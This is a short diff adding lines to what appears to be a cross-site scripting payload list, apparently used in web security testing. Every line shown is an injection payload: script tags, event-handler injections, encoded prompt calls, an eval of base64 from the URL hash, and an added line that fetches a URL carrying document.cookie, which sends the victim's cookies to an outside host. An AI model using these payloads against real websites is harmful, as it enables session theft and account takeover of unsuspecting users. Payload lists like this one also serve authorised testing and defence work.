@@ -13,6 +13,7 @@
 "/><script>alert(1);</script>
 ";alert("XSS in "+document.domain);//
 "<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
+"<script>alert(1)</script>"@a.com
 ">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
 ">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
 "><"<img src="x">%20%20> "<iframe src=a>%20<iframe>
@@ -332,6 +333,7 @@ alert(1)
 alert(XSS)
 alert(document.domain)
 am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+app.alert(1)
 astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
 bash$ touch '"><svg onload=alert(3);>'
 confirm('XSS')\
@@ -341,6 +343,7 @@ curl "https://target.com/content/search.php?PHPSESSID=\">XSSHERE<script>alert(1)
 document.cookie
 document.domain
 emailbody=0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
+fetch('https://target.com/?c='+document.cookie)
 fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')
 foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)
 foo"><script src=//target.com/2.js></script><x=".com
